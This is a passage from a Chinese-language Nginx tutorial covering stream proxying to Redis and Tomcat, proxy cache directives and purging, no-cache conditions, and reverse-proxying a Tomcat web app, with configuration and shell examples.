redis<br></code></pre></td></tr></table></figure><p>使用Nginx将请求分发到不同的Redis服务器上。</p><p>(2)准备Tomcat服务器.</p><p>1.上传tomcat的安装包，<code>apache-tomcat-8.5.56.tar.gz</code></p><p>2.将安装包进行解压缩</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">56</span>.tar.gz<br></code></pre></td></tr></table></figure><p>3.进入tomcat的bin目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> apache-tomcat-8.5.56/bin<br>./startup<br></code></pre></td></tr></table></figure><p>nginx.conf配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">stream</span> &#123;<br>        <span class="hljs-section">upstream</span> redisbackend &#123;<br>                <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:6379</span>;<br>                <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:6378</span>;<br>        &#125;<br>        <span class="hljs-section">upstream</span> tomcatbackend &#123;<br>        <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.23.132:8080</span>;<br>        &#125;<br>        <span class="hljs-section">server</span> &#123;<br>                <span class="hljs-attribute">listen</span>  <span class="hljs-number">81</span>;<br>                <span class="hljs-attribute">proxy_pass</span> redisbackend;<br>        &#125;<br>        <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span><span class="hljs-number">82</span>;<br>        <span class="hljs-attribute">proxy_pass</span> tomcatbackend;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问测试。</p><h1 id="nginx缓存集成"><a class="markdownIt-Anchor" href="#nginx缓存集成"></a> Nginx缓存集成</h1><h2 id="缓存的概念"><a class="markdownIt-Anchor" href="#缓存的概念"></a> 缓存的概念</h2><p>缓存就是数据交换的缓冲区(称作:Cache),当用户要获取数据的时候，会先从缓存中去查询获取数据，如果缓存中有就会直接返回给用户，如果缓存中没有，则会发请求从服务器重新查询数据，将数据返回给用户的同时将数据放入缓存，下次用户就会直接从缓存中获取数据。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591944051969.png" alt="1591944051969" /></p><p>缓存其实在很多场景中都有用到，比如：</p><table><thead><tr><th>场景</th><th>作用</th></tr></thead><tbody><tr><td>操作系统磁盘缓存</td><td>减少磁盘机械操作</td></tr><tr><td>数据库缓存</td><td>减少文件系统的IO操作</td></tr><tr><td>应用程序缓存</td><td>减少对数据库的查询</td></tr><tr><td>Web服务器缓存</td><td>减少对应用服务器请求次数</td></tr><tr><td>浏览器缓存</td><td>减少与后台的交互次数</td></tr></tbody></table><p>缓存的优点</p><p>​1.减少数据传输，节省网络流量，加快响应速度，提升用户体验；</p><p>​2.减轻服务器压力；</p><p>​3.提供服务端的高可用性；</p><p>缓存的缺点</p><p>​1.数据的不一致</p><p>​2.增加成本</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1582295367198.png" alt="1582295367198" /></p><p>本次课程注解讲解的是Nginx,Nginx作为web服务器，Nginx作为Web缓存服务器，它介于客户端和应用服务器之间，当用户通过浏览器访问一个URL时，web缓存服务器会去应用服务器获取要展示给用户的内容，将内容缓存到自己的服务器上，当下一次请求到来时，如果访问的是同一个URL，web缓存服务器就会直接将之前缓存的内容返回给客户端，而不是向应用服务器再次发送请求。web缓存降低了应用服务器、数据库的负载，减少了网络延迟，提高了用户访问的响应速度，增强了用户的体验。</p><h2 id="nginx的web缓存服务"><a class="markdownIt-Anchor" href="#nginx的web缓存服务"></a> Nginx的web缓存服务</h2><p>Nginx是从0.7.48版开始提供缓存功能。Nginx是基于Proxy Store来实现的，其原理是把URL及相关组合当做Key,在使用MD5算法对Key进行哈希，得到硬盘上对应的哈希目录路径，从而将缓存内容保存在该目录中。它可以支持任意URL连接，同时也支持404/301/302这样的非200状态码。Nginx即可以支持对指定URL或者状态码设置过期时间，也可以使用purge命令来手动清除指定URL的缓存。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591947990200.png" alt="1591947990200" /></p><h2 id="nginx缓存设置的相关指令"><a class="markdownIt-Anchor" href="#nginx缓存设置的相关指令"></a> Nginx缓存设置的相关指令</h2><p>Nginx的web缓存服务主要是使用<code>ngx_http_proxy_module</code>模块相关指令集来完成，接下来我们把常用的指令来进行介绍下。</p><h3 id="proxy_cache_path"><a class="markdownIt-Anchor" href="#proxy_cache_path"></a> proxy_cache_path</h3><p>该指定用于设置缓存文件的存放路径</p><table><thead><tr><th>语法</th><th>proxy_cache_path path [levels=number] <br/>keys_zone=zone_name:zone_size [inactive=time][max_size=size];</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http</td></tr></tbody></table><p><code>path</code>:缓存路径地址,如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local/proxy_cache<br></code></pre></td></tr></table></figure><p><code>levels</code>: 指定该缓存空间对应的目录，最多可以设置3层，每层取值为1|2如 :</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">levels=<span class="hljs-number">1</span>:<span class="hljs-number">2</span>   缓存空间有两层目录，第一次是<span class="hljs-number">1</span>个字母，第二次是<span class="hljs-number">2</span>个字母<br>举例说明:<br>itheima[key]通过MD5加密以后的值为 <span class="hljs-number">43</span>c8233266edce38c2c9af0694e2107d<br>levels=<span class="hljs-number">1</span>:<span class="hljs-number">2</span>   最终的存储路径为<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span>d/<span class="hljs-number">07</span><br>levels=<span class="hljs-number">2</span>:<span class="hljs-number">1</span>:<span class="hljs-number">2</span> 最终的存储路径为<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span><span class="hljs-number">7</span>d<span class="hljs-regexp">/0/</span><span class="hljs-number">21</span><br>levels=<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">2</span> 最终的存储路径为??<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span><span class="hljs-number">7</span>d<span class="hljs-regexp">/10/</span>e2<br></code></pre></td></tr></table></figure><p><code>keys_zone</code>:用来为这个缓存区设置名称和指定大小，如：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keys_zone</span>=itcast:<span class="hljs-number">200</span>m  缓存区的名称是itcast,大小为<span class="hljs-number">200</span>M,<span class="hljs-number">1</span>M大概能存储<span class="hljs-number">8000</span>个keys<br></code></pre></td></tr></table></figure><p><code>inactive</code>:指定缓存的数据多次时间未被访问就将被删除，如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">inactive</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>d   缓存数据在<span class="hljs-number">1</span>天内没有被访问就会被删除<br></code></pre></td></tr></table></figure><p><code>max_size</code>:设置最大缓存空间，如果缓存空间存满，默认会覆盖缓存时间最长的资源，如:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">max_size</span>=<span class="hljs-number">20</span>g<br></code></pre></td></tr></table></figure><p>配置实例:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">http&#123;<br>proxy_cache_path /usr/local/proxy_cache <span class="hljs-attribute">keys_zone</span>=itcast:200m  <span class="hljs-attribute">levels</span>=1:2:1 <span class="hljs-attribute">inactive</span>=1d <span class="hljs-attribute">max_size</span>=20g;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="proxy_cache"><a class="markdownIt-Anchor" href="#proxy_cache"></a> proxy_cache</h3><p>该指令用来开启或关闭代理缓存，如果是开启则自定使用哪个缓存区来进行缓存。</p><table><thead><tr><th>语法</th><th>proxy_cache zone_name|off;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_cache off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>zone_name：指定使用缓存区的名称</p><h3 id="proxy_cache_key"><a class="markdownIt-Anchor" href="#proxy_cache_key"></a> proxy_cache_key</h3><p>该指令用来设置web缓存的key值，Nginx会根据key值MD5哈希存缓存。</p><table><thead><tr><th>语法</th><th>proxy_cache_key key;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_cache_key $scheme$proxy_host$request_uri;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><h3 id="proxy_cache_valid"><a class="markdownIt-Anchor" href="#proxy_cache_valid"></a> proxy_cache_valid</h3><p>该指令用来对不同返回状态码的URL设置不同的缓存时间</p><table><thead><tr><th>语法</th><th>proxy_cache_valid [code …] time;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">proxy_cache_valid <span class="hljs-number">200</span> <span class="hljs-number">302</span> <span class="hljs-number">10</span>m<span class="hljs-comment">;</span><br>proxy_cache_valid <span class="hljs-number">404</span> <span class="hljs-number">1</span>m<span class="hljs-comment">;</span><br>为<span class="hljs-number">200</span>和<span class="hljs-number">302</span>的响应URL设置<span class="hljs-number">10</span>分钟缓存，为<span class="hljs-number">404</span>的响应URL设置<span class="hljs-number">1</span>分钟缓存<br>proxy_cache_valid any <span class="hljs-number">1</span>m<span class="hljs-comment">;</span><br>对所有响应状态码的URL都设置<span class="hljs-number">1</span>分钟缓存<br></code></pre></td></tr></table></figure><h3 id="proxy_cache_min_uses"><a class="markdownIt-Anchor" href="#proxy_cache_min_uses"></a> proxy_cache_min_uses</h3><p>该指令用来设置资源被访问多少次后被缓存</p><table><thead><tr><th>语法</th><th>proxy_cache_min_uses number;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_cache_min_uses 1;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><h3 id="proxy_cache_methods"><a class="markdownIt-Anchor" href="#proxy_cache_methods"></a> proxy_cache_methods</h3><p>该指令用户设置缓存哪些HTTP方法</p><table><thead><tr><th>语法</th><th>proxy_cache_methods GET|HEAD|POST;</th></tr></thead><tbody><tr><td>默认值</td><td>proxy_cache_methods GET HEAD;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>默认缓存HTTP的GET和HEAD方法，不缓存POST方法。</p><h2 id="nginx缓存设置案例"><a class="markdownIt-Anchor" href="#nginx缓存设置案例"></a> Nginx缓存设置案例</h2><h4 id="需求分析-2"><a class="markdownIt-Anchor" href="#需求分析-2"></a> 需求分析</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591959569463.png" alt="1591959569463" /></p><h4 id="步骤实现"><a class="markdownIt-Anchor" href="#步骤实现"></a> 步骤实现</h4><p>1.环境准备</p><p>应用服务器的环境准备</p><p>（1）在192.168.23.132服务器上的tomcat的webapps下面添加一个js目录，并在js目录中添加一个jquery.js文件</p><p>（2）启动tomcat</p><p>（3）访问测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/js/</span>jquery.js<br></code></pre></td></tr></table></figure><p>Nginx的环境准备</p><p>（1）完成Nginx反向代理配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">http&#123;<br>upstream backend&#123;<br>server <span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span>;<br>&#125;<br>server &#123;<br>listen       <span class="hljs-number">8080</span>;<br>        server_name  localhost;<br>        location / &#123;<br>        proxy_pass http:<span class="hljs-regexp">//</span>backend<span class="hljs-regexp">/js/</span>;<br>        &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）完成Nginx缓存配置</p><p>4.添加缓存配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">http&#123;<br>proxy_cache_path <span class="hljs-regexp">/usr/</span>local/proxy_cache levels=<span class="hljs-number">2</span>:<span class="hljs-number">1</span> keys_zone=itcast:<span class="hljs-number">200</span>m inactive=<span class="hljs-number">1</span>d max_size=<span class="hljs-number">20</span>g;<br>upstream backend&#123;<br>server <span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span>;<br>&#125;<br>server &#123;<br>listen       <span class="hljs-number">8080</span>;<br>        server_name  localhost;<br>        location / &#123;<br>            proxy_cache itcast;<br>            proxy_cache_key itheima;<br>            proxy_cache_min_uses <span class="hljs-number">5</span>;<br>            proxy_cache_valid <span class="hljs-number">200</span> <span class="hljs-number">5</span>d;<br>            proxy_cache_valid <span class="hljs-number">404</span> <span class="hljs-number">30</span>s;<br>            proxy_cache_valid any <span class="hljs-number">1</span>m;<br>            add_header nginx-cache <span class="hljs-string">&quot;$upstream_cache_status&quot;</span>;<br>            proxy_pass http:<span class="hljs-regexp">//</span>backend<span class="hljs-regexp">/js/</span>;<br>        &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nginx缓存的清除"><a class="markdownIt-Anchor" href="#nginx缓存的清除"></a> Nginx缓存的清除</h2><h3 id="方式一删除对应的缓存目录"><a class="markdownIt-Anchor" href="#方式一删除对应的缓存目录"></a> 方式一:删除对应的缓存目录</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span>......<br></code></pre></td></tr></table></figure><h3 id="方式二使用第三方扩展模块"><a class="markdownIt-Anchor" href="#方式二使用第三方扩展模块"></a> 方式二:使用第三方扩展模块</h3><h4 id="ngx_cache_purge"><a class="markdownIt-Anchor" href="#ngx_cache_purge"></a> ngx_cache_purge</h4><p>（1）下载ngx_cache_purge模块对应的资源包，并上传到服务器上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ngx_cache_purge</span>-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.tar.gz<br></code></pre></td></tr></table></figure><p>（2）对资源文件进行解压缩</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf ngx_cache_purge-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.tar.gz<br></code></pre></td></tr></table></figure><p>（3）修改文件夹名称，方便后期配置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mv</span> ngx_cache_purge-<span class="hljs-number">2</span>.<span class="hljs-number">3</span> purge<br></code></pre></td></tr></table></figure><p>（4）查询Nginx的配置参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><p>（5）进入Nginx的安装目录，使用./configure进行参数配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --add-module=/</span>root<span class="hljs-regexp">/nginx/m</span>odule/purge<br></code></pre></td></tr></table></figure><p>（6）使用make进行编译</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>（7）将nginx安装目录的nginx二级制可执行文件备份</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/sbin/</span>nginxold<br></code></pre></td></tr></table></figure><p>（8）将编译后的objs中的nginx拷贝到nginx的sbin目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp objs<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx/sbin<br></code></pre></td></tr></table></figure><p>（9）使用make进行升级</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make upgrade</span><br></code></pre></td></tr></table></figure><p>（10）在nginx配置文件中进行如下配置</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server&#123;<br><span class="hljs-keyword">location</span> <span class="hljs-title">~/purge</span>(/.*) &#123;<br>proxy_cache_purge itcast itheima;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nginx设置资源不缓存"><a class="markdownIt-Anchor" href="#nginx设置资源不缓存"></a> Nginx设置资源不缓存</h2><p>前面咱们已经完成了Nginx作为web缓存服务器的使用。但是我们得思考一个问题就是不是所有的数据都适合进行缓存。比如说对于一些经常发生变化的数据。如果进行缓存的话，就很容易出现用户访问到的数据不是服务器真实的数据。所以对于这些资源我们在缓存的过程中就需要进行过滤，不进行缓存。</p><p>Nginx也提供了这块的功能设置，需要使用到如下两个指令</p><h3 id="proxy_no_cache"><a class="markdownIt-Anchor" href="#proxy_no_cache"></a> proxy_no_cache</h3><p>该指令是用来定义不将数据进行缓存的条件。</p><table><thead><tr><th>语法</th><th>proxy_no_cache string …;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>配置实例</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_no_cache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br></code></pre></td></tr></table></figure><h3 id="proxy_cache_bypass"><a class="markdownIt-Anchor" href="#proxy_cache_bypass"></a> proxy_cache_bypass</h3><p>该指令是用来设置不从缓存中获取数据的条件。</p><table><thead><tr><th>语法</th><th>proxy_cache_bypass string …;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>配置实例</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_cache_bypass</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br></code></pre></td></tr></table></figure><p>上述两个指令都有一个指定的条件，这个条件可以是多个，并且多个条件中至少有一个不为空且不等于&quot;0&quot;,则条件满足成立。上面给的配置实例是从官方网站获取的，里面使用到了三个变量，分别是$cookie_nocache、$arg_nocache、$arg_comment</p><h3 id="cookie_nocache-arg_nocache-arg_comment"><a class="markdownIt-Anchor" href="#cookie_nocache-arg_nocache-arg_comment"></a> $cookie_nocache、$arg_nocache、$arg_comment</h3><p>这三个参数分别代表的含义是:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$cookie</span>_nocache</span><br>指的是当前请求的cookie中键的名称为nocache对应的值<br><span class="hljs-meta"><span class="hljs-keyword">$arg</span>_nocache和$arg_comment</span><br>指的是当前请求的参数中属性名为nocache和comment对应的属性值<br></code></pre></td></tr></table></figure><p>案例演示下:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span> params <span class="hljs-variable">$cookie_nocache</span> | <span class="hljs-variable">$arg_nocache</span> | <span class="hljs-variable">$arg_comment</span>；<br>server&#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8081</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">access_log</span> logs/access_params.log params;<br><span class="hljs-attribute">add_header</span> Set-Cookie <span class="hljs-string">&#x27;nocache=999&#x27;</span>;<br><span class="hljs-attribute">root</span> html;<br><span class="hljs-attribute">index</span> index.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="案例实现"><a class="markdownIt-Anchor" href="#案例实现"></a> 案例实现</h3><p>设置不缓存资源的配置方案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">server&#123;<br>listen8080;<br>server_name localhost;<br>location / &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_uri</span> ~ /.*\.js$)&#123;<br>           <span class="hljs-built_in">set</span> <span class="hljs-variable">$nocache</span> 1;<br>        &#125;<br>    proxy_no_cache <span class="hljs-variable">$nocache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br>        proxy_cache_bypass <span class="hljs-variable">$nocache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="nginx实现服务器端集群搭建"><a class="markdownIt-Anchor" href="#nginx实现服务器端集群搭建"></a> Nginx实现服务器端集群搭建</h1><h2 id="nginx与tomcat部署"><a class="markdownIt-Anchor" href="#nginx与tomcat部署"></a> Nginx与Tomcat部署</h2><p>前面课程已经将Nginx的大部分内容进行了讲解，我们都知道了Nginx在高并发场景和处理静态资源是非常高性能的，但是在实际项目中除了静态资源还有就是后台业务代码模块，一般后台业务都会被部署在Tomcat，weblogic或者是websphere等web服务器上。那么如何使用Nginx接收用户的请求并把请求转发到后台web服务器？</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604498725652.png" alt="1604498725652" /></p><p>步骤分析:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.准备Tomcat环境，并在Tomcat上部署一个web项目<br>2.准备Nginx环境，使用Nginx接收请求，并把请求分发到Tomat上<br></code></pre></td></tr></table></figure><h3 id="环境准备tomcat"><a class="markdownIt-Anchor" href="#环境准备tomcat"></a> 环境准备(Tomcat)</h3><p>浏览器访问:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/i</span>ndex.html<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604421296014.png" alt="1604421296014" /></p><p>获取动态资源的链接地址:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p>本次课程将采用Tomcat作为后台web服务器</p><p>（1）在Centos上准备一个Tomcat</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Tomcat官网地址:https://tomcat.apache.org/<br><span class="hljs-attribute">2</span>.下载tomcat,本次课程使用的是apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">59</span>.tar.gz<br><span class="hljs-attribute">3</span>.将tomcat进行解压缩<br><span class="hljs-attribute">mkdir</span> web_tomcat<br><span class="hljs-attribute">tar</span> -zxf apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">59</span>.tar.gz -C /web_tomcat<br></code></pre></td></tr></table></figure><p>（2）准备一个web项目，将其打包为war</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.将资料中的demo.war上传到tomcat8目录下的webapps包下<br>2.将tomcat进行启动，进入tomcat8的bin目录下<br>./startup.sh<br></code></pre></td></tr></table></figure><p>（3）启动tomcat进行访问测试。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">静态资源: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/i</span>ndex.html<br>动态资源: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><h3 id="环境准备nginx"><a class="markdownIt-Anchor" href="#环境准备nginx"></a> 环境准备(Nginx)</h3><p>（1）使用Nginx的反向代理，将请求转给Tomcat进行处理。</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">upstream <span class="hljs-keyword">webservice</span> &#123;<br>server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.146</span><span class="hljs-operator">:</span>8080;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br>    listen<span class="hljs-number">80</span>;<br>    server_name localhost;<br>    location <span class="hljs-operator">/</span><span class="hljs-keyword">demo</span> &#123;<br>    proxy_pass http<span class="hljs-operator">:</span><span class="hljs-comment">//webservice;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）启动访问测试</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604421312486.png" alt="1604421312486" /></p><p>学习到这，可能大家会有一个困惑，明明直接通过tomcat就能访问，为什么还需要多加一个nginx，这样不是反而是系统的复杂度变高了么?<br />那接下来我们从两个方便给大家分析下这个问题，</p><p>第一个使用Nginx实现动静分离</p><p>第二个使用Nginx搭建Tomcat的集群</p><h2 id="nginx实现动静分离"><a class="markdownIt-Anchor" href="#nginx实现动静分离"></a> 